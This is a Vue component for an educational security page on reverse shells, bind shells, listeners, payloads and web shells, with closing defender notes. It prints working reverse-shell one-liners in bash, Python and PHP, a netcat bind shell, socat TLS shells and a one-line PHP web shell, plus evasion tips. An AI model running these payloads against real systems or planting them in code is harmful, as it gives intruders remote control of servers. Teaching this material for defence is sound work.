<script setup>
// Single-topic explainer — content inline, no JSON file.
</script>

<template>
  <div class="page-shell" style="--accent: #d97757">
    <div class="page">
      <header class="hdr">
        <div class="icon">⌨</div>
        <div>
          <h1>Shells</h1>
          <div class="sub">
            Reverse shells, bind shells, listeners, payloads, and web
            shells — how attackers turn code execution into an interactive
            session.
          </div>
        </div>
      </header>

      <div class="callout">
        <strong>Mental model</strong>
        Code execution is a one-shot — you can run a command and see its
        output once. A <em>shell</em> is the upgrade: a persistent
        interactive session where stdin, stdout, and stderr of a remote
        process are wired to your terminal. Every shell technique below is
        a different way to set up that wiring across a network.
      </div>

      <!-- Reverse vs bind -->
      <section class="section">
        <h2>Reverse shells vs bind shells</h2>
        <p class="prose">
          The two directions a shell connection can go. The
          <strong>direction of the TCP connection</strong> is the only
          fundamental difference — once it's established, both look
          identical at the prompt.
        </p>

        <div class="prop-grid">
          <article class="prop">
            <h3>Reverse shell</h3>
            <p>
              The <em>victim</em> connects out to the
              <em>attacker</em>. The attacker runs a listener on a public
              IP/port; the payload on the target opens a TCP socket to
              that listener and pipes <code>/bin/sh</code> through it.
            </p>
            <p>
              <strong>Why it's the default:</strong> egress firewalls are
              almost always more permissive than ingress. A box behind NAT
              can't be connected to from the internet, but it can usually
              reach out on 80/443.
            </p>
          </article>
          <article class="prop">
            <h3>Bind shell</h3>
            <p>
              The <em>victim</em> opens a listening port; the
              <em>attacker</em> connects in. The payload calls
              <code>bind()</code> + <code>listen()</code> + <code>accept()</code>
              and then <code>exec()</code>s a shell against the accepted
              socket.
            </p>
            <p>
              <strong>When it's used:</strong> the target has no outbound
              path (air-gapped or strict egress filtering), or you've
              already pivoted into a network where reaching the target's
              port is easier than getting a callback out.
            </p>
          </article>
        </div>

        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Aspect</th>
                <th>Reverse shell</th>
                <th>Bind shell</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Who initiates the connection</td>
                <td>Victim → Attacker</td>
                <td>Attacker → Victim</td>
              </tr>
              <tr>
                <td>Where the listener runs</td>
                <td>Attacker</td>
                <td>Victim</td>
              </tr>
              <tr>
                <td>Defeats inbound NAT/firewall on victim</td>
                <td><span class="ok">Yes</span></td>
                <td><span class="bad">No</span></td>
              </tr>
              <tr>
                <td>Defeats outbound egress filtering</td>
                <td><span class="bad">No</span></td>
                <td><span class="ok">Yes</span></td>
              </tr>
              <tr>
                <td>Visible to network defenders as</td>
                <td>Outbound connection from internal host to unusual IP</td>
                <td>Unexpected listening port on internal host</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Listeners -->
      <section class="section">
        <h2>Listeners — receiving the shell</h2>
        <p class="prose">
          A <em>listener</em> is whatever you run on the receiving end to
          accept the incoming connection (reverse shell) or to drive the
          remote listening socket (bind shell). Three tools cover most of
          the day-to-day work.
        </p>

        <h3 class="subhead">netcat — the swiss army knife</h3>
        <p class="prose">
          <code>nc</code> (and the more featureful <code>ncat</code> from
          Nmap) is the canonical TCP listener. <code>nc -lvnp 4444</code>
          listens on port 4444 with verbose output, no DNS, persistent
          mode. When the victim connects, you get raw stdin/stdout wired
          to the socket.
        </p>
        <pre class="snippet"><code># Reverse shell — attacker side
$ nc -lvnp 4444
listening on [any] 4444 ...

# Bind shell — attacker side, connect to victim's listening port
$ nc 10.0.0.5 4444</code></pre>
        <p class="prose">
          Caveats with stock <code>nc</code>: no TTY, no job control, no
          line editing — Ctrl-C kills the listener instead of the remote
          process, arrow keys print escape codes, tab-completion is gone.
          See the upgrade pattern below.
        </p>

        <h3 class="subhead">socat — netcat with adult supervision</h3>
        <p class="prose">
          <code>socat</code> bidirectionally wires two arbitrary
          endpoints (sockets, files, PTYs, OpenSSL streams). It's the
          right tool when you want a <em>fully interactive</em> shell, an
          encrypted channel, or both.
        </p>
        <pre class="snippet"><code># Attacker side — listen with a real PTY
$ socat -d -d file:`tty`,raw,echo=0 tcp-listen:4444

# Victim side — payload that gives a TTY-backed shell
$ socat tcp:10.0.0.10:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane

# TLS-encrypted variant — generate cert.pem first
$ socat openssl-listen:4444,reuseaddr,cert=cert.pem,verify=0 file:`tty`,raw,echo=0
$ socat openssl:10.0.0.10:4444,verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane</code></pre>

        <h3 class="subhead">rlwrap — readline around any listener</h3>
        <p class="prose">
          <code>rlwrap</code> is not a listener itself — it's a wrapper
          that gives <em>any</em> line-based program GNU readline support:
          arrow-key history, Ctrl-A / Ctrl-E, persistent history file.
          Wrap your <code>nc</code> with it to turn a painful raw socket
          into a usable prompt.
        </p>
        <pre class="snippet"><code>$ rlwrap nc -lvnp 4444</code></pre>
        <p class="prose">
          Doesn't fix the lack of a TTY — Ctrl-C still kills the listener
          and full-screen programs (<code>vim</code>, <code>top</code>)
          still misbehave. For that, upgrade the shell once it lands:
        </p>
        <pre class="snippet"><code># On the caught shell — three-step TTY upgrade
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ^Z                              # suspend in attacker terminal
$ stty raw -echo; fg              # back to remote, raw mode
$ export TERM=xterm-256color      # so vim/less behave
$ stty rows 40 columns 160        # match your local terminal</code></pre>
      </section>

      <!-- Payloads -->
      <section class="section">
        <h2>Shell payloads</h2>
        <p class="prose">
          The "payload" is the bit of code that runs on the target and
          actually opens the connection. The right one depends on what's
          installed and what the attacker can deliver — most boxes have
          at least one of bash, python, or php available. Replace
          <code>10.0.0.10</code> and <code>4444</code> with your listener.
        </p>

        <h3 class="subhead">Bash</h3>
        <pre class="snippet"><code># Reverse shell — bash's /dev/tcp pseudo-device
$ bash -c 'bash -i >&amp; /dev/tcp/10.0.0.10/4444 0&gt;&amp;1'

# Bind shell — listen on port 4444, exec bash on connect
$ mkfifo /tmp/f; nc -lvnp 4444 &lt; /tmp/f | /bin/bash &gt; /tmp/f 2&gt;&amp;1</code></pre>
        <p class="prose">
          <code>/dev/tcp</code> is a bash-specific feature, not a real
          device file — it works in <code>bash</code> but not
          <code>dash</code>, <code>ash</code>, or BusyBox shells. The
          <code>0&gt;&amp;1</code> redirection is what wires stdin to the
          same socket as stdout/stderr.
        </p>

        <h3 class="subhead">Python</h3>
        <pre class="snippet"><code># Reverse shell — works on Python 3, modern stdlib only
python3 -c 'import socket,os,pty;
s=socket.socket();
s.connect(("10.0.0.10",4444));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("/bin/bash")'</code></pre>
        <p class="prose">
          Notice <code>pty.spawn()</code> — Python's stdlib gives you a
          real TTY for free, so you skip the manual upgrade dance.
          Slightly larger payload than bash, but works on any host with
          Python and is much more pleasant once it lands.
        </p>

        <h3 class="subhead">PHP</h3>
        <pre class="snippet"><code>// One-liner reverse shell — drop into a PHP file or eval
&lt;?php
$sock = fsockopen("10.0.0.10", 4444);
$proc = proc_open("/bin/sh -i", [$sock, $sock, $sock], $pipes);
?&gt;</code></pre>
        <p class="prose">
          Useful when the target is a web server with PHP enabled but no
          interactive shell binary in the request handler's path. Some
          hardened setups disable <code>fsockopen</code> /
          <code>proc_open</code> / <code>exec</code> via
          <code>disable_functions</code> in <code>php.ini</code> — the
          first thing to check before assuming PHP RCE means a shell.
        </p>

        <h3 class="subhead">Picking the right payload</h3>
        <ul class="bulletlist">
          <li>
            <strong>Check what's installed.</strong>
            <code>which python3 python perl ruby ncat socat</code> on the
            initial RCE answers most of it.
          </li>
          <li>
            <strong>Mind the shell type.</strong> If you only have
            <code>sh</code>, the bash <code>/dev/tcp</code> trick won't
            work — fall back to <code>nc</code>, <code>python</code>, or a
            mkfifo pipeline.
          </li>
          <li>
            <strong>Watch out for quoting.</strong> When delivering via a
            web vuln, your payload is a string going through one or more
            URL-decode / shell-parse steps. Base64-encode the inner
            command and decode it on the target — fewer escaping
            nightmares.
          </li>
          <li>
            <strong>Use HTTPS / port 443.</strong> A reverse shell to
            <code>443/tcp</code> blends in with normal egress and slips
            past lazy egress filters.
          </li>
        </ul>
      </section>

      <!-- Web shells -->
      <section class="section">
        <h2>Web shells</h2>
        <p class="prose">
          A <em>web shell</em> is a script — PHP, ASP/ASPX, JSP, Python —
          uploaded to a web server that takes a command from an HTTP
          request and returns the output. It's a shell where the
          "transport" is plain HTTP requests instead of a TCP socket.
        </p>

        <pre class="snippet"><code>&lt;?php system($_GET["cmd"]); ?&gt;</code></pre>
        <p class="prose">
          The minimum-viable PHP web shell. Drop it as
          <code>shell.php</code>, hit
          <code>https://target/uploads/shell.php?cmd=id</code>, and
          there's your code execution. Real-world web shells (China
          Chopper, c99, b374k, WSO) add file management, database access,
          credential harvesters, and obfuscation — but the core idea is
          the four lines above.
        </p>

        <h3 class="subhead">How they're delivered</h3>
        <ul class="bulletlist">
          <li>
            <strong>Insecure file uploads</strong> — the classic. Upload
            handler doesn't validate file type / extension / content, or
            puts uploaded files inside the web root with executable
            extensions intact.
          </li>
          <li>
            <strong>RCE → drop file</strong> — any other RCE primitive
            (deserialisation, SQLi <code>INTO OUTFILE</code>,
            template injection) used to write the script into a webroot.
          </li>
          <li>
            <strong>LFI + log poisoning</strong> — inject PHP into a
            file the server already reads (Apache access log, /proc/self/environ),
            then include it via a local file inclusion vuln.
          </li>
          <li>
            <strong>Compromised plugin / theme</strong> — supply-chain
            web shells are baked into WordPress plugins, Magento
            extensions, and npm packages.
          </li>
        </ul>

        <h3 class="subhead">Web shells vs reverse shells</h3>
        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Property</th>
                <th>Web shell</th>
                <th>Reverse shell</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Transport</td>
                <td>HTTP(S) requests</td>
                <td>Raw TCP (or wrapped TLS)</td>
              </tr>
              <tr>
                <td>State</td>
                <td>Stateless — each request is independent</td>
                <td>Stateful — interactive session</td>
              </tr>
              <tr>
                <td>Persistence on target</td>
                <td><span class="warn">Persistent file</span> on disk</td>
                <td><span class="ok">In-memory</span> until process dies</td>
              </tr>
              <tr>
                <td>Forensic footprint</td>
                <td>File on disk + access log entries</td>
                <td>Process + open socket + maybe history</td>
              </tr>
              <tr>
                <td>Survives reboot</td>
                <td><span class="ok">Yes</span></td>
                <td><span class="bad">No</span> (without separate persistence)</td>
              </tr>
              <tr>
                <td>Blends with normal traffic</td>
                <td><span class="ok">Excellent</span> — looks like web requests</td>
                <td><span class="warn">Depends</span> on port and TLS use</td>
              </tr>
            </tbody>
          </table>
        </div>
        <p class="prose">
          A common attacker pattern is to <em>chain</em> them: drop a web
          shell for persistence, then use it to launch a reverse shell
          when interactive access is needed. The web shell is the staying
          power; the reverse shell is the work surface.
        </p>
      </section>

      <!-- Defender notes -->
      <section class="section">
        <h2>Defender notes</h2>
        <ul class="bulletlist bulletlist--warn">
          <li>
            <strong>Egress filtering matters more than ingress.</strong>
            Reverse shells beat ingress firewalls. Restrict outbound
            traffic from servers — only the ports/destinations they
            actually need.
          </li>
          <li>
            <strong>Look for unusual child processes of web servers.</strong>
            <code>nginx → bash</code>, <code>w3wp.exe → cmd.exe</code>,
            <code>java → /bin/sh</code> — almost always a webshell or
            unserialise RCE.
          </li>
          <li>
            <strong>Hunt for new files in webroots.</strong>
            File-integrity monitoring on <code>/var/www</code>,
            <code>wwwroot</code>, plugin directories. Webshells get
            uploaded; clean codebases don't change without a deploy.
          </li>
          <li>
            <strong>Listening ports on workstations.</strong> Bind shells
            on user endpoints stand out — nothing legitimate is
            <code>LISTEN</code>ing on a random high port on an HR laptop.
          </li>
          <li>
            <strong>TLS-wrapped reverse shells</strong> defeat plaintext
            inspection but still produce JA3 fingerprints, unusual SNI,
            and oddly-timed beacons. Behavioural detection over
            content-based.
          </li>
        </ul>
      </section>
    </div>
  </div>
</template>

<style scoped>
.callout {
  background: var(--sf2);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 11.5px;
  color: var(--dm);
  margin-bottom: 24px;
}
.callout strong {
  color: var(--accent);
  font-family: var(--sans);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  display: block;
  margin-bottom: 4px;
}
.callout em {
  color: var(--tx);
  font-style: italic;
}

.section {
  margin-bottom: 32px;
}
.section h2 {
  font-family: var(--sans);
  font-size: 15px;
  font-weight: 700;
  color: #fff;
  letter-spacing: 0.02em;
  margin: 0 0 12px;
}
.subhead {
  margin: 18px 0 8px;
  font-family: var(--sans);
  font-size: 12px;
  font-weight: 700;
  color: var(--accent);
  text-transform: uppercase;
  letter-spacing: 0.08em;
}

.prose {
  color: var(--tx);
  font-size: 12.5px;
  line-height: 1.7;
  margin: 0 0 12px;
}
.prose code,
.bulletlist code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11.5px;
  color: #9cdcfe;
}
.prose strong,
.bulletlist strong {
  color: #fff;
}
.prose em {
  color: var(--accent);
  font-style: normal;
}

.prop-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
  gap: 10px;
  margin-bottom: 12px;
}
.prop {
  background: var(--sf);
  border: 1px solid var(--bd);
  border-top: 2px solid var(--accent);
  border-radius: 10px;
  padding: 12px 14px;
}
.prop h3 {
  margin: 0 0 6px;
  font-family: var(--sans);
  font-size: 12px;
  font-weight: 700;
  color: #fff;
  letter-spacing: 0.02em;
}
.prop p {
  margin: 0 0 6px;
  color: var(--tx);
  font-size: 11.5px;
  line-height: 1.6;
}
.prop p:last-child {
  margin-bottom: 0;
}
.prop code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 0 5px;
  font-size: 11px;
  color: #9cdcfe;
}
.prop em {
  color: var(--accent);
  font-style: normal;
}
.prop strong {
  color: #fff;
}

.table-wrap {
  overflow-x: auto;
  border: 1px solid var(--bd);
  border-radius: 8px;
  background: var(--sf);
  margin-bottom: 12px;
}
.tbl {
  width: 100%;
  border-collapse: collapse;
  font-size: 12px;
}
.tbl th,
.tbl td {
  text-align: left;
  padding: 8px 12px;
  border-bottom: 1px solid var(--bd);
  vertical-align: top;
  color: var(--tx);
}
.tbl thead th {
  background: var(--sf2);
  font-family: var(--sans);
  font-size: 10px;
  font-weight: 700;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: var(--dm);
}
.tbl tbody tr:last-child td {
  border-bottom: 0;
}
.tbl tbody tr:hover {
  background: var(--sf2);
}
.tbl code {
  background: var(--bg);
  border: 1px solid var(--bd);
  border-radius: 4px;
  padding: 1px 5px;
  font-size: 11px;
  color: #9cdcfe;
  white-space: nowrap;
}
.tbl strong {
  color: #fff;
}

.ok,
.warn,
.bad {
  display: inline-block;
  font-family: var(--sans);
  font-size: 9.5px;
  font-weight: 700;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  border-radius: 999px;
  padding: 2px 8px;
}
.ok {
  background: color-mix(in srgb, #2ead6c 16%, transparent);
  color: #2ead6c;
  border: 1px solid #2ead6c;
}
.warn {
  background: color-mix(in srgb, #e8952a 16%, transparent);
  color: #e8952a;
  border: 1px solid #e8952a;
}
.bad {
  background: color-mix(in srgb, #d14c4c 16%, transparent);
  color: #d14c4c;
  border: 1px solid #d14c4c;
}

.snippet {
  margin: 0 0 12px;
  background: var(--bg);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 6px;
  padding: 10px 12px;
  font-family: var(--mono);
  font-size: 11.5px;
  color: var(--accent);
  overflow-x: auto;
  white-space: pre;
}

.bulletlist {
  margin: 0;
  padding: 12px 14px 12px 30px;
  background: var(--sf);
  border: 1px solid var(--bd);
  border-left: 2px solid var(--accent);
  border-radius: 8px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.bulletlist li {
  font-size: 12px;
  color: var(--tx);
  line-height: 1.6;
}
.bulletlist--warn {
  border-left-color: #d14c4c;
}
</style>
